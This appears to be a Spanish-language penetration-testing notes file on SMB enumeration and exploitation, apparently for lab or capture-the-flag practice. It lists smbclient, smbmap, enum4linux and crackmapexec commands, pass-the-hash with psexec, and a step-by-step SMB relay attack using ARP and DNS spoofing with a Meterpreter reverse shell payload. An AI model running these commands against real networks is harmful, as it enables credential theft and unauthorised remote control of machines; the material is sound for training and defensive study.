<h1 align="center">Herramientas para SMB</h1>

# **SMBCLIENT**

Si el puerto 445 (SMB) está abierto podemos listar los directorios que se están compartiendo sin contraseña:

- `smbclient -L *ip* -N`

\- N para listar los que puedas acceder a través de una Null Session (Sin contraseña)

Para acceder al directorio

- `smbclient //*ip*/*Nombre del directorio* -N`
- `smbclient //*ip*/*Nombre del directorio* -U *usuario*`

# **SMBMAP**

Con smbclient no podemos ver los permisos que tenemos sobre las carpetas compartidas, para eso podemos usar smbmap

- `smbmap -H *ip*`

Tras enumerar los usuarios que pueden acceder por SMB podemos mirar qué permisos tienen en los recursos compartidos:

![image](https://github.com/user-attachments/assets/7752073f-8126-4acb-bd29-ffe62af8c305)

Como el usuario administrador tiene permisos de administrador en C: podemos ejecutar comandos con -x:

![image](https://github.com/user-attachments/assets/23ba0498-9722-4fd8-a512-fefa797ce49d)

Para listar los discos que están compartidos:

![image](https://github.com/user-attachments/assets/9917df3a-dd11-43a6-aff9-b33e9af8b881)

Para ver el contenido de C:

![image](https://github.com/user-attachments/assets/3d957964-b7b7-43ba-a5b9-8aa7defdca5d)

Para subir un archivo desde nuestra máquina local a servidor SMB en "C:" podemos utilizar el siguiente comando:
![image](https://github.com/user-attachments/assets/7adbf0ab-6939-4d89-aecb-f4b0730d7c82)

Para descargar la flag que hemos encontrado antes en C:

![image](https://github.com/user-attachments/assets/1e6b8e15-0aec-4e18-9ca6-9fc7bb45cc24)

# **CRACKMAPEXEC**

Tambien se pueden listar los directorios compartidos con crackmapexec

- `crackmapexec smb *ip* -u ' ' -p ''`

Se añaden las comillas porque no sabemos las credenciales (null session)

# **ENUM4LINUX**

Cuando queremos enumerar los recursos compartidos, usuarios y politicas de seguridad de un sistema windows para evaluar posibles vulnerabilidades y configuraciones incorrectas utilizaremos esta herramienta.

Lo primero que tenemos que hacer es identificar el rango de IPs que queremos auditar:

- `enum4linux -U -G -S -P -D -O 192.168.1.100`

\-U: Enumerar usuarios.

\-G: Enumerar grupos.

\-S: Enumerar shares (recursos compartidos).

\-P: Enumerar políticas de contraseñas.

\-D: Enumerar la información del dominio.

\-o: Enumerar OS y versión.

- `enum4linux -a *ip*`

\-a: Enumeracion completa

- `enum4linux -r -u "admin" -p "password1" *ip*`

\-r: Enumeracion recursiva,incluyendo grupos, usuarios, detalles sobre las políticas de seguridad, y otros datos relevantes.

# **REDIS**

`redis-cli -h *ip*`

- Si el puerto de redis esta abierto (6379) se accede con este comando

# **PSEXEC**

Cuando disponemos de las credenciales de algun usuario en SMB, podemos utilizar la herramienta PSEXEC para conseguir una sesion de meterpreter.

![image](https://github.com/user-attachments/assets/520a64a0-ab0a-4ecd-be8f-201c060fc8bb)

Si no disponemos de la contraseña podemos utilizar el hash ntlm en el campo de SMB_Pass realizando un ataque “Pass the Hash”. Para ello es importante seleccionar SET TARGET NATIVE\\ UPLOAD

Tambien podemos comprobarlo con:  

`crackmapexec smb *ip* -u *usuario* -H *hash obtenido*`

Esto nos dira si las credenciales son correctas, con psexec realizaremos la conexión

# **RPCCLIENT**

Tambien nos podemos conectar con una null session con el comando rpcclient. Con esto podemos obtener mas información del sistema

`rpcclient 192.168.11.2 -U "" -N`

# **PIPES (tuberias)**

SMB es un protocolo utilizado por muchos servicios, a la forma en la que se comunican entre los servidores se le llama PIPES. Si podemos acceder SMB, es probable que podamos acceder a otros servicios con las mismas credenciales. Para eso hay un modulo en metasploit:

use auxiliar/scanner/smb/pipe_auditor

![image](https://github.com/user-attachments/assets/975dbc11-d232-4bdc-9e5d-a6c087d3c39d)

# **VER Y USAR LOS RECURSOS COMPARTIDOS EN WINDOWS**

- `net view *ip*`

- `net use *Letra disco donde quieras guardar la carpeta*: \\*ip*\recurso`

![image](https://github.com/user-attachments/assets/c4731baf-eb30-49a6-962e-d88ed7c7074d)

![image](https://github.com/user-attachments/assets/3b2fca91-b3c7-4d88-9022-509d17760ca6)

Para ver el contenido:  

- `dir *Letra del disco*`

# **SMB relay attack**

![image](https://github.com/user-attachments/assets/69b5a100-bf92-48e3-898a-454bdd033c17)

Este es un paso a paso para realizar un ataque SMB Relay combinado con ARP Spoofing y DNS Spoofing para comprometer una máquina con Windows. El objetivo del ataque es interceptar una conexión SMB y aprovechar las credenciales de la víctima para obtener acceso no autorizado a otra máquina dentro de la red.

### Paso 1: Configurar el exploit de SMB Relay en Metasploit

1. Iniciar Metasploit (msfconsole):
2. Usar el exploit smb_relay:
    - `use exploit/windows/smb/smb_relay:`

Este módulo explota la vulnerabilidad de relay de SMB, que permite interceptar credenciales SMB de una víctima y reutilizarlas para ejecutar comandos en otro equipo vulnerable.

1. Configurar los parámetros del exploit:
    - SRVHOST: Es la dirección IP de la máquina atacante (172.16.5.101).
    - PAYLOAD:
        1. `windows/meterpreter/reverse_tcp`
    - LHOST: Es la dirección IP a la cual el payload enviará la sesión de Meterpreter.
    - SMBHOST: Es la máquina objetivo que será atacada (172.16.5.10).
2. Ejecutar el exploit: Esto inicia el servidor SMB en la máquina atacante, listo para interceptar conexiones SMB entrantes.

### Paso 2: Configurar DNS Spoofing

1. dnsspoof: Esta herramienta redirige solicitudes de DNS hacia la máquina atacante.
2. Crear un archivo DNS falso:
    - `echo "172.16.5.101 *.sportsfoo.com" > dns`: Este comando crea un archivo DNS donde todas las peticiones a subdominios de sportsfoo.com se redirigen a la máquina atacante (172.16.5.101).
3. Ejecutar dnsspoof:
    - `dnsspoof -i eth1 -f dns`: Este comando pone en marcha el redireccionamiento de DNS. Cada vez que una víctima intenta resolver un subdominio de sportsfoo.com, es redirigido al atacante.

### Paso 3: Ataque Man-in-the-Middle (MiTM) con ARP Spoofing

1. Habilitar el reenvío de paquetes:
    - `echo 1 > /proc/sys/net/ipv4/ip_forward`: Habilita el reenvío de paquetes para que los paquetes interceptados entre la víctima y el gateway puedan ser reenviados.
2. Ejecutar ARP Spoofing:
    - `arpspoof -i eth1 -t 172.16.5.5 172.16.5.1`: Envenena la caché ARP de la víctima (172.16.5.5), haciendo que crea que el atacante es el gateway (172.16.5.1).
    - `arpspoof -i eth1 -t 172.16.5.1 172.16.5.5`: Envenena la caché ARP del gateway, haciendo que crea que el atacante es la víctima.
3. Con esto, el tráfico entre la víctima y el gateway pasa a través de la máquina atacante, permitiendo manipular y espiar las conexiones.

### Combinación de Ataques (SMB Relay + DNS Spoofing + ARP Spoofing)

1. Intercepción de conexiones SMB:
    - Cuando la víctima (Windows 7, 172.16.5.5) intenta conectarse al servidor de archivos fileserver.sportsfoo.com, debido al DNS Spoofing, es redirigido a la máquina atacante (172.16.5.101) en lugar del servidor real.
2. Captura de credenciales SMB:
    - La máquina víctima envía sus credenciales SMB al atacante, creyendo que está conectándose al servidor legítimo. El exploit de SMB Relay captura estas credenciales (hashes SMB).
3. Uso de las credenciales para comprometer el objetivo:
    - El exploit utiliza las credenciales capturadas para autenticarse en otro sistema (172.16.5.10, especificado en SMBHOST) y ejecutar el payload, obteniendo acceso a la máquina de destino mediante una sesión Meterpreter.

### Resumen del Ataque

Este ataque combina varias técnicas para comprometer una máquina en la red:

- DNS Spoofing para redirigir las solicitudes de SMB a la máquina atacante.
- ARP Spoofing para interceptar y manipular el tráfico entre la víctima y el gateway.
- SMB Relay para capturar las credenciales SMB de la víctima y usarlas para obtener acceso remoto a otra máquina en la red.

Una vez que las credenciales se capturan y se reutilizan, el atacante obtiene una sesión Meterpreter en la máquina objetivo con privilegios administrativos, lo que permite ejecutar comandos y tomar control del sistema.
